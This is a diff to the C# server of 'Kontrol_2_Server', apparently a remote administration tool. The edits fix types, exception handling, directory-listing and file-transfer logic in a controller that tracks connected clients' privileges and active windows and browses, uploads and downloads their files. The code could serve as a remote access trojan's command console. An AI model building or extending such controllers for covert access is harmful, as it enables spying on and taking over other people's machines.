@@ -24,7 +24,7 @@ namespace Kontrol_2_Server
 		//Server and client global variables
 		private static Socket _serverSocket;
 		private const int _BUFFER_SIZE = 20971520;
-		private const int _PORT = 7878;
+		private const ushort _PORT = 7878;
 		private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
 		private static readonly List<Socket> _clientSockets = new List<Socket>();
 		private static List<ClientInfo> _clientInfos = new List<ClientInfo>();
@@ -41,15 +41,15 @@ namespace Kontrol_2_Server
 		public static ReKodeEditor rke = new ReKodeEditor();
 
 		//File operation variables
-		public static int fo_mode = -1;
+		public static byte fo_mode = 255;
 		public static string fo_path = null;
 		public static MemoryStream fileStream;
-		public static long fo_size = 0;
+		public static int fo_size = 0;
 		public static int fo_writeSize = 0;
 		private static byte[] fileBuffer = new byte[1];
 
-		private static long recievedBytes = 0;
-		private static long sentBytes = 0;
+		private static int recievedBytes = 0;
+		private static int sentBytes = 0;
 		PerformanceCounter cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
 		PerformanceCounter ramCounter = new PerformanceCounter("Memory", "Available MBytes");
 		public MainForm()
@@ -251,12 +251,22 @@ namespace Kontrol_2_Server
 					}
 					else if (resp.StartsWith("conditions_scasm"))
 					{
-						rke.rf.Apppend(resp.Split('\n')[1]);
+						try
+						{
+							string[] xsplit = resp.Split('\n').Skip(1).ToArray();
+							foreach (var str in xsplit)
+							{
+								rke.rf.Apppend(str);
+							}
+						}
+						catch { }
 					}
 					else if (resp.StartsWith("active_window"))
 					{
 						string[] xsplit = resp.Split('\n');
-						_clientInfos[int.Parse(xsplit[1])].activeWindow = xsplit[2];
+						ClientInfo ci = _clientInfos[int.Parse(xsplit[1])];
+						ci.activeWindow = xsplit[2];
+						_clientInfos[int.Parse(xsplit[1])] = ci;
 						listClients();
 					}
 					else if (resp.StartsWith("process_info"))
@@ -265,13 +275,15 @@ namespace Kontrol_2_Server
 					}
 					else if (resp.StartsWith("dir_info#"))
 					{
-						string[] xsplit = resp.Split('#')[1].Split('\n');
+						string[] xsplit = resp.Split('#')[2].Split('\n');
 
 						foreach (string entry in xsplit)
 						{
 							try
 							{
-								fmf.addFileToList(entry.Split('&')[0], entry.Split('&')[1], entry.Split('&')[2], entry.Split('&')[3], entry.Split('&')[4]);
+								if (fmf.currentPath == resp.Split('#')[1]) fmf.addFileToList(entry.Split('&')[0], entry.Split('&')[1], entry.Split('&')[2], entry.Split('&')[3], entry.Split('&')[4]);
+								else
+									break;
 							}
 							catch { }
 						}
@@ -328,17 +340,22 @@ namespace Kontrol_2_Server
 						switch (resp.Split('\n')[1])
 						{
 							case "file_beginUpload":
-								fo_size = SendBytes(File.ReadAllBytes(fo_path), fmf.clientId);
-								GC.Collect();
-								GC.WaitForPendingFinalizers();
+								try
+								{
+									Thread.Sleep(3000);
+									fo_size = SendBytes(File.ReadAllBytes(fo_path), fmf.clientId);
+									GC.Collect();
+									GC.WaitForPendingFinalizers();
+								} 
+								catch { }
 								break;
 							case "file_uploadFinished":
 								fo_path = null;
-								fo_mode = -1;
+								fo_mode = 255;
 								MessageBox.Show("Uplaod finished!");
 								break;
 							case "file_beginDownload":
-								fo_size = long.Parse(resp.Split('\n')[2]);
+								fo_size = int.Parse(resp.Split('\n')[2]);
 								fo_mode = 0;
 								fo_writeSize = 0;
 								fileBuffer = new byte[fo_size];
@@ -556,10 +573,9 @@ namespace Kontrol_2_Server
 		}
 		public int SendBytes(byte[] data, int targetClient)
 		{
-			Socket s = _clientSockets[targetClient];
-			s.Send(data);
-			sentBytes = data.Length;
-			return data.Length;
+			int sent = _clientSockets[targetClient].Send(data);
+			sentBytes = sent;
+			return sent;
 		}
 		public void SendBytesAll(byte[] data)
 		{
@@ -573,7 +589,7 @@ namespace Kontrol_2_Server
 			//Console.Write($"\rRecieved: {data.Length} fo_writeSize: {fo_writeSize} fo_size: {fo_size}");
 			Buffer.BlockCopy(data, 0, fileBuffer, fo_writeSize, data.Length);
 			fo_writeSize += data.Length;
-			if (fo_writeSize == fo_size)
+			if (fo_writeSize >= fo_size)
 			{
 				using (var fs = new FileStream(fo_path, FileMode.Create, FileAccess.Write))
 				{
@@ -583,13 +599,11 @@ namespace Kontrol_2_Server
 				//fileStream.Close();
 				fo_writeSize = 0;
 				fo_size = 0;
-				fo_mode = -1;
+				fo_mode = 255;
 				fmf.progressBarUpdate(0);
 				Array.Clear(fileBuffer, 0, fileBuffer.Length);
 				SendCommand("file_operation\nfile_uploadFinished", fmf.clientId);
 				MessageBox.Show("download finished");
-				GC.Collect();
-				GC.WaitForPendingFinalizers();
 			}
 			else
 				fmf.progressBarUpdate((float) fo_writeSize / (float) fo_size * 100f);
@@ -840,7 +854,8 @@ namespace Kontrol_2_Server
 			}
 		}
 	}
-	public class ClientInfo
+
+	public struct ClientInfo
 	{
 		public int id { get; set; }
 		public string ip { get; set; }
@@ -854,7 +869,8 @@ namespace Kontrol_2_Server
 		public string privilege { get; set; }
 		public string activeWindow { get; set; }
 	}
-	public class IpInfo
+
+	public struct IpInfo
 	{
 		[JsonProperty("ip")]
 		public string Ip { get; set; }
